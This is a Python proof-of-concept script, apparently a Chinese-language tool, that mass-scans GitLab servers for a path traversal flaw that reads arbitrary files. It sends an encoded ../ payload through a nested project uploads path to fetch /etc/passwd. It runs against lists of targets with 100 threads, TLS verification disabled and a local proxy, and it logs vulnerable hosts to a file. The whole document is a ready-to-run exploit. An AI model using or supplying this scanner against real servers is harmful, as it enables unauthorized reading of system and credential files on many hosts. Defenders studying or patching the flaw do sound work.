import requests,argparse,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """             /$$   /$$     /$$           /$$      
                          |__/  | $$    | $$          | $$      
                  /$$$$$$  /$$ /$$$$$$  | $$  /$$$$$$ | $$$$$$$ 
                 /$$__  $$| $$|_  $$_/  | $$ |____  $$| $$__  $$
                | $$  \ $$| $$  | $$    | $$  /$$$$$$$| $$  \ $$
                | $$  | $$| $$  | $$ /$$| $$ /$$__  $$| $$  | $$
                |  $$$$$$$| $$  |  $$$$/| $$|  $$$$$$$| $$$$$$$/
                 \____  $$|__/   \___/  |__/ \_______/|_______/ 
                 /$$  \ $$                                      
                |  $$$$$$/                                      
                 \______/                                       
                                               author:sanhua
                                               ate:2024-09-13
                                               version:1.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="gitlab路径遍历读取任意文件漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('gitlab_result51.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()